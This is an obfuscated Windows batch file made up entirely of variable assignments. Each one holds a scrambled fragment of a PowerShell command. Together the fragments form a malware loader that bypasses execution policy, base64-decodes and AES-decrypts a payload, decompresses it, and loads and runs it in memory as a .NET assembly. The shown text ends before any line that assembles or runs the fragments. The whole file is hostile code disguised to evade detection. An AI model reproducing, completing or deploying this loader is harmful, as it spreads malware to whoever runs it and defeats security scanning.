@echo off
set "OklrlWPcrD=bypa"
set "opcvjZiFgI== $k"
set "iGTWCXdazg='[-1"
set "cDAuYvOtIq=tem."
set "GZBfbqlnnP=ew-O"
set "oiWDMBtKai=ose("
set "vZEInIIwnv=ress"
set "PbGahonoQl=.Cry"
set "iLboAkbPzT=flec"
set "pxOtNulYso=em.C"
set "EPvNSrgisR=ct S"
set "HgZaGMPhiy=ubQR"
set "wMSjokiSwL=[Sys"
set "WCQSIXdnvC= [Sy"
set "DNHEcXwECe=[Sys"
set "cqNGBRXwhJ=k; }"
set "EHKcnhKcvJ=ay()"
set "lzQRWZtHOn= '')"
set "jzQUkSNeVj=gMod"
set "KNTwAIRpOm=rity"
set "aNrBcZzeWl=gth)"
set "LKXIhHdsgz=ect "
set "qIVgRDgZIq=ubQR"
set "FuscjEISbj=pose"
set "vlVySetDhM=stem"
set "ntYmFQTfbs=onve"
set "YandRuRXmx=R.Pa"
set "zFWVSXXjbE=();$"
set "ELVUmuzDJk=.Cre"
set "rPbVaLLgZe=..-1"
set "qApCfzKiYE=Rg ="
set "AkVRuWuCCC=).Sp"
set "EFyayJnXfz=TSC."
set "wChwXPIJGl=e]::"
set "dIqhUJaNNo='')("
set "NJIkQxDVEH=;$cV"
set "njaLIcHhcS=y]::"
set "msuuuEWogk=, (,"
set "ILvTCqEokZ=; };"
set "bibfXJKtec=raph"
set "ZoENuJeTml=Fo7l"
set "kyZFhEQldp=rans"
set "qXWkyOqViZ=$MfJ"
set "BGIpJnNyDg=;$qr"
set "HVOLSDHBxa=g = "
set "AdNaIzqATj=oint"
set "nRnTZoZdDs= = ["
set "bgSWvlSFmY=$LJy"
set "CbOWAAaFdQ= [st"
set "PVxQDuyXwf=Star"
set "JzUborFlwX=UzG."
set "yTMqbwFiaE=bldS"
set "fLKHQrRUpR=J = "
set "GeFTXIDDIM=ke($"
set "oAgxgDUYWU=S46e"
set "IWpohmpfUl=th('"
set "FHAAbfDTkm=);$L"
set "kDhNPDjFyB=7Yiv"
set "iEIErtZuZX=ubQR"
set "UUoPmbDZxa=iron"
set "JNPmvvYQwG=-joi"
set "QkHyDMOxQV=ateD"
set "cyyeaghgJk=oryS"
set "WlWUxnWVBo=ddin"
set "sOnrGAzsyU=ptog"
set "tlrVXFXURE=n ''"
set "rGocwFuxgO=$cVr"
set "EuwGIaTeqB=embl"
set "uucJjBuItE=EEbT"
set "gRHoOouPrE=bTJ."
set "snDgbCuijO=ptor"
set "eePILZOikL=);$k"
set "lJTsniJzYM=)($M"
set "ikpxbNosHq=urit"
set "HCRkZwXPAG=oc.T"
set "SkbGnjLiPK=pDZz"
set "rvENyfkHUH=$KoB"
set "PHlGDEFlOF=);$q"
set "lzlDcoBccI=BC;$"
set "wfxAHSBcNS=$kub"
set "XpbFbyBGDn=6esa"
set "MwAPCQuKDv=ach "
set "qnjkkEsmWL=pres"
set "DqXwQUENBZ=null"
set "TkbiLzXxYI=pher"
set "GgpLVBMJoZ='dqR"
set "fRVEkRfsBG==');"
set "fvaMnSGtxB= '')"
set "ERAIyLQYSj=-nop"
set "TtUXbmiCJg=n ''"
set "otTQrVXjgr=ss -"
set "ulJEJmSRia=Comp"
set "LjhiCFETaw= if "
set "UZKKTCdbyV=)))"
set "yFoWAuYXlY=hy.A"
set "SjVReAyKHo=in $"
set "UXkLunJkys=[]] "
set "tgJuSOIaxp=ose("
set "IyhXSZAfxi=brea"
set "EGgYLEcEpB=KoBI"
set "ftdkfGMCnM=bldS"
set "VyeahNyImX=-1.."
set "xzdczRkiri=V = "
set "fqHKojHRWO=New-"
set "wDQELVSVQM=tem."
set "PKsFsQWCoo=Syst"
set "tJfmXVcLvv=16] "
set "YuNNrExHrM=);$k"
set "oDniySYmFn=Rg);"
set "dRzaeuJkar=gnir"
set "SjYRuKdcEK=Obje"
set "WCcRMtAUzb=rity"
set "NzbpaDSMyQ=ubQR"
set "OjtRxpQCWu=ck($"
set "LDDjtQIAuO=Hp.T"
set "WYAjfYqJuA=ne);"
set "YnwjQfdwbo=.Cop"
set "LrByZdvbMg=ress"
set "yzfCCiTOFs=grap"
set "mmTcvjpdku=g, 0"
set "JbJjxskqJV=oc);"
set "bzsdWnDLAe=]::C"
set "NTSGQahnva=.Dis"
set "CtdMFouiJk=;$EE"
set "dIvnvuLIfO=rofi"
set "DOLnFzLbFB=-joi"
set "nvjfrrICdG=rHp "
set "beLXAkLBvV=..-1"
set "HxdcrhFlqr=comp"
set "WnuHfkmiLI=[Sys"
set "IRGIgVqNwt=vj0m"
set "ZiETIKEDJo=tsWi"
set "SwXaagyNmY=($Nw"
set "msXSUKdUqS=File"
set "YJUqChxVqN=le  "
set "uaVYPPsrce=)($t"
set "GvqGcNgeBB=vert"
set "tmZfRLQeZo=nage"
set "svGAAmlsJv=Yv.D"
set "eNJmRngTni=fore"
set "QLkpqILLUt=g = "
set "PzhohgyStP=Secu"
set "DgTnUpIFNd=MfJR"
set "NcJekDyNBl=ode]"
set "NZYwpLboKO=orF'"
set "kSuUqBkCOz=0O+g"
set "khDeTENmtT=7;$k"
set "hiyCYlFifP=.Mod"
set "PAKeWqgEpE=($Nw"
set "YiEuRPcUgE=:('g"
set "kbVQFCqrvn=.Len"
set "vKdanqVURX=.Mem"
set "RCSQKczPie=ion."
set "rFzIQWmGid=.Sec"
set "gtYAcaHEVE= = N"
set "xteAZSpUHG=stem"
set "aBcYnDiKyq=TJ, "
set "KbVztbKWds=oArr"
set "ItLEvSRUoL=ert]"
set "EHyaygsoTv='txe"
set "LGrJwFxsQD= [Sy"
set "aWjEhYtctB=ypto"
set "epxttANqlQ=ct S"
set "VlLMdUdyPD=[IO."
set "yexmCNobMD=-ep "
set "NtATedMsva=yste"
set "nPIXyNnSOA=fJRg"
set "QhvXYWZiuH=join"
set "pGsdEEGnmD=OyzA"
set "OuDOYVNXTu=daeR"
set "OsNGTpWzBh=bstr"
set "tkDICzxgVy=Disp"
set "nUIfLYljKH=comm"
set "pGNuCeogyH=]::N"
set "JgMBaBeuPK=sGUc"
set "gKGkIHvwtq=m.Re"
set "NiyEDlPTSd=Mode"
set "ZCAgNuLqaL=mory"
set "ERfluSIKWT=ment"
set "fKptVyZnEo=ring"
set "bRTZUtWzHU=;$cV"
set "IBrgYAUbsE=)) {"
set "sjmGfNXVnK=stem"
set "vMnNCYZGpW=);$R"
set "BFnhzAaHAR=oin "
set "WYQaRZxPrX=pose"
set "erpEcZoiCM=('l0"
set "rRQKaXgupI=ress"
set "qvManYnCGg=form"
set "LnRLVILRkk=yste"
set "PDMRvadPIw=trea"
set "LpxxjBBaWp=('%*'"
set "meKaBXkqOc=.Com"
set "WVYfgRCBri=am;$"
set "SrYmSAXXjJ=lit("
set "bvqNDhFhPT=Syst"
set "iNRGdJSVYg=tS46"
set "CEiNWzvfDi=Bmor"
set "WfpfPEymOJ=oQud"
set "YdNgSMLita=em.I"
set "PNscjOSypa=Comp"
set "TTIsZpBKiu=] -j"
set "REgwbaXDam=yTo("
set "zIaNoCVhRp=Obje"
set "aOPgJjeJbC=1] -"
set "xudhUDZxnb=pStr"
set "rvZOovDHtx=LJyY"
set "qVGDiLABqd=Disp"
set "kWHCwRYAlE=y.Cr"
set "XytVZxekEp=.Ass"
set "oEiwFeEWRb=PKCS"
set "QxOzwUZYCr=3); "
set "EKdCVTNdoS=QR.I"
set "tvvztyStiM=join"
set "hMMdEQUWYI=ispo"
set "VwjKhcVGGC= New"
set "MbChoSGiIq=  $t"
